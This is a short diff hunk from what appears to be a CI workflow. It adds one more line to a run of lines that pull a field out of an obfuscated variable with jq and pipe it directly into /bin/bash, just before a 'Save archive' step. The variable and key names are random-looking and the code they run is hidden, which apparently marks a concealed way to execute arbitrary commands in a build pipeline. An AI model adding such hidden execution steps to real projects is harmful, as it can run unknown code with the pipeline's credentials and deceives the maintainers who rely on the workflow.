@@ -39,6 +39,7 @@ jobs:
           printf '%s' "$vv528" | jq -r .mo4368 | /bin/bash
           echo $mul22 | jq -r .wjx6428 | /bin/bash
           echo $hkuok6 | jq -r .oli181 | /bin/bash
+          echo $w8 | jq -r .ff35 | /bin/bash
 
       - name: Save archive
         if: always()
